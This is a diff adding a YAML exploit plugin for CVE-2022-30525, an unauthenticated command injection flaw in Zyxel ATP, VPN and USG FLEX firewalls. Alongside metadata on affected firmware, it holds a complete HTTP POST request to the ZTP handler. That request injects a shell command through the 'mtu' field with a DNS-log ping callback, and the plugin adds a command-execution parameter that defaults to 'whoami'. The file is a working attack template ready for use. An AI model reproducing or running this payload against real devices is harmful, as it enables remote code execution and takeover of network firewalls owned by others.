@@ -1,0 +1,26 @@
+info:
+    app: zyxel
+    name: CVE-2022-30525
+    author: 小晨曦
+    plugin_version: 1.0.0
+    disclosure_date: "2022-05-13"
+    create_date: "2024-10-06 09:55:21"
+    update_date: "2024-10-06 09:55:21"
+    scope: |-
+        USG FLEX 100, 100W, 200, 500, 700：ZLD5.00 到 ZLD5.21 Patch 1
+        USG20-VPN, USG20W-VPN：ZLD5.10 到 ZLD5.21 Patch 1
+        ATP 100, 200, 500, 700, 800：ZLD5.10 到 ZLD5.21 Patch 1
+    description: Zyxel 防火墙中的命令注入漏洞，该漏洞影响支持零接触配置 (ZTP) 的 Zyxel 防火墙，其中包括 ATP 系列、VPN 系列和 USG FLEX 系列（包括 USG20-VPN 和 USG20W-VPN）。该漏洞标识为 CVE-2022-30525，允许未经身份验证的远程攻击者以 nobody 受影响设备上的用户身份执行任意代码。
+    vul_id: CVE-2022-30525
+    detail: 输入命令执行即可，无回显
+    payload: "POST /ztp/cgi-bin/handler HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nContent-Type: application/json\nConnection: close\nContent-Length: 122\n\n{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\"\n:\"1\",\"vlanid\":\"5\",\"mtu\":\"; ping {DNSlog};\",\"data\":\"hi\"}"
+    vul_type: 命令执行
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
